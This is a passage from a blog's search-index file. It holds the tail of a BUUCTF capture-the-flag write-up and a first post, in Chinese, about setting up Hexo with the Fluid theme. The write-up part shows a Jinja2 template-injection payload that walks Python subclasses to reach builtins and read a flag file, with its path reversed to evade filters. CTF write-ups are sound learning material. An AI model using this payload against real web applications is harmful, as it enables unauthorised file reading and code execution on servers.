class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;</span><br><span class="line">&#123;% if c.__name__&#x3D;&#x3D;&#39;catch_warnings&#39; %&#125;</span><br><span class="line">&#123;&#123; </span><br><span class="line">c.__init__.__globals__[&#39;__builtins__&#39;].open(&#39;txt.galf_eht_si_siht&#x2F;&#39;[::-1], &#39;r&#39;).read()</span><br><span class="line">&#125;&#125;</span><br><span class="line">&#123;% endif %&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/virtua1/note_pictures/raw/master/20210419201816.png" alt="image-20210419201816421"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> buuctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>This is the first blog</title>
      <link href="2021/04/18/The_first_blog/"/>
      <url>2021/04/18/The_first_blog/</url>
      
        <content type="html"><![CDATA[<h2 id="This-is-the-first-blog"><a href="#This-is-the-first-blog" class="headerlink" title="This is the first blog"></a>This is the first blog</h2><h3 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h3><p>学生时代马上结束了，服务器也到期了</p><p>又回到了刚接触网络安全的时候所采用的的低成本方式：Github+Hexo</p><p>博客用于记录自己的一些学习笔记，方便梳理自己的知识体系，同时也通过写博客来督促自己完成学习任务，减少一些DDL</p><p>去年一年准备各种考试，技术方面落下了不少，正在恶补的同时希望能够继续提升自己</p><p>That’s all………</p><h3 id="主题"><a href="#主题" class="headerlink" title="主题"></a>主题</h3><p>基于对Material Design 风格的热爱，采用<a href="https://hexo.fluid-dev.com/docs/">Fluid</a>主题</p><p>主题 GitHub: <a href="https://github.com/fluid-dev/hexo-theme-fluid">https://github.com/fluid-dev/hexo-theme-fluid</a></p><p>主题文档：<a href="https://hexo.fluid-dev.com/docs/start/">https://hexo.fluid-dev.com/docs/start/</a></p><p>安装方便，Hexo 5.0.0 版本以上，通过 npm 直接安装：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install --save hexo-theme-fluid</span><br></pre></td></tr></table></figure><p>博客目录下创建<code>_config.fluid.yml</code>文件，copy github的内容，根据自己的需要修改配置。</p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
